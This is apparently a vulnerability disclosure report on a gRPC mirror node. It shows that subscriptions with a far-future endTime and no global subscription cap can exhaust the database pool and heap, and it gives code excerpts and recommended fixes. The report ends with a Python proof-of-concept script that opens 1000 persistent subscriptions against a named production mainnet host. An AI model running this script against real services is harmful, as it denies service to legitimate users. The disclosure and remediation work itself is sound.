### Title
Unbounded `endTime` Allows Indefinite Subscription Accumulation Leading to Resource Exhaustion DoS in `PollingTopicListener`

### Summary
An unprivileged external user can open an unlimited number of gRPC topic subscriptions with `endTime` set arbitrarily far in the future (e.g., year 2100 in nanoseconds). Because `TopicMessageFilter` imposes no upper bound on `endTime`, and because there is no global subscription cap, each subscription creates a persistent `PollingContext` that polls the database every 500 ms indefinitely. An attacker opening many such subscriptions across multiple connections can exhaust the database connection pool and JVM heap, causing a denial of service.

### Finding Description

**Root cause — no upper bound on `endTime`:**

`TopicMessageFilter.isValidEndTime()` only checks that `endTime > startTime`:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java, lines 43-46
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
```

There is no constraint preventing `endTime` from being set to, e.g., `4102444800_000000000L` (year 2100 in nanoseconds). `isValidStartTime()` only guards `startTime`:

```java
// lines 48-51
@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();
}
```

**Subscription never terminates:**

`TopicMessageServiceImpl.isComplete()` returns `false` until `filter.getEndTime()` is past `Instant.now()` plus `endTimeInterval` (default 30 s):

```java
// TopicMessageServiceImpl.java, lines 203-215
boolean isComplete() {
    if (filter.getEndTime() == null) { return false; }
    if (filter.getEndTime() < startTime) { return true; }
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())
            .isBefore(Instant.now());
}
```

With `endTime` = year 2100, `isComplete()` returns `false` for ~75 years. `pastEndTime()` therefore never signals completion.

**Infinite polling loop per subscription:**

`PollingTopicListener.listen()` creates a new `PollingContext` per call and schedules polling with `RepeatSpec.times(Long.MAX_VALUE)`:

```java
// PollingTopicListener.java, lines 34-48
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);
    Duration interval = listenerProperties.getInterval();
    return Flux.defer(() -> poll(context))
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                    .jitter(0.1)
                    .withFixedDelay(interval)
                    .withScheduler(scheduler))
            ...
}
```

Each subscription fires a `findByFilter` DB query every 500 ms (default `interval`) for the lifetime of the connection.

**No global subscription limit:**

`subscriberCount` is tracked as a Micrometer gauge but is never enforced as a ceiling:

```java
// TopicMessageServiceImpl.java, lines 88-91
return topicExists(filter)
        .thenMany(flux.doOnNext(topicContext::onNext)
                .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                .doFinally(s -> subscriberCount.decrementAndGet())
```

**Per-connection limit is insufficient:**

`maxConcurrentCallsPerConnection = 5` limits streams per TCP connection, but there is no limit on the number of TCP connections an attacker may open:

```java
// GrpcConfiguration.java, line 33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

An attacker opens C connections × 5 streams each = 5C simultaneous subscriptions, each polling the DB every 500 ms.

### Impact Explanation

With N active subscriptions, the server issues 2N DB queries per second (one `findByFilter` per subscription per 500 ms interval). The gRPC DB connection pool is finite; once saturated, legitimate queries queue or fail. Simultaneously, each subscription retains a `PollingContext`, a `TopicContext`, and a Reactor chain in heap memory. At scale this causes:

- **Database connection pool exhaustion** — new legitimate subscribers receive errors or timeouts.
- **JVM heap pressure / OOM** — accumulated Reactor subscription objects and context state grow without bound.
- **Scheduler thread starvation** — the `boundedElastic` scheduler used for polling becomes saturated.

This constitutes a non-network-based DoS affecting the gRPC mirror node service, which is a critical component for HCS (Hedera Consensus Service) consumers.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly accessible with no authentication required. The attacker needs only a valid `topicId` (trivially discoverable from the public ledger) and the ability to open multiple TCP connections. No special privileges, tokens, or credentials are required. The attack is repeatable, automatable with a simple gRPC client loop, and the subscriptions persist as long as the attacker keeps connections open. The `maxRatePerEndpoint: 250` GCP gateway rate limit slows subscription creation but does not cap total concurrent live streams.

### Recommendation

1. **Enforce an upper bound on `endTime`** in `TopicMessageFilter.isValidEndTime()`: reject any `endTime` beyond a configurable maximum horizon (e.g., `now + 30 days`).
2. **Enforce a global concurrent subscription limit**: check `subscriberCount` against a configurable maximum before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()`, returning `RESOURCE_EXHAUSTED` when exceeded.
3. **Enforce a per-IP or per-connection subscription limit** at the gRPC interceptor layer.
4. **Set a server-level `maxConnectionAge`** via `NettyServerBuilder.maxConnectionAge()` to recycle long-lived connections and force re-authentication/re-validation.

### Proof of Concept

```python
import grpc
from concurrent.futures import ThreadPoolExecutor
# proto: com.hedera.mirror.api.proto.ConsensusService/subscribeTopic

YEAR_2100_NS = 4102444800_000_000_000  # nanoseconds
TARGET = "mirror.mainnet.hedera.com:443"

def open_subscription(i):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = ConsensusServiceStub(channel)
    req = ConsensusTopicQuery(
        topicID=TopicID(topicNum=1234),
        consensusStartTime=Timestamp(seconds=0),
        consensusEndTime=Timestamp(seconds=YEAR_2100_NS // 1_000_000_000),
        limit=0  # unlimited
    )
    for _ in stub.subscribeTopic(req):
        pass  # drain slowly / never

# Open 200 connections × 5 streams = 1000 concurrent subscriptions
with ThreadPoolExecutor(max_workers=1000) as ex:
    for i in range(1000):
        ex.submit(open_subscription, i)
# Each subscription polls DB every 500ms → 2000 DB queries/second sustained
```

Each subscription keeps a `PollingContext` alive in the server heap and issues a `findByFilter` query every 500 ms. With 1000 subscriptions the server issues 2000 DB queries/second, exhausting the connection pool and triggering OOM.
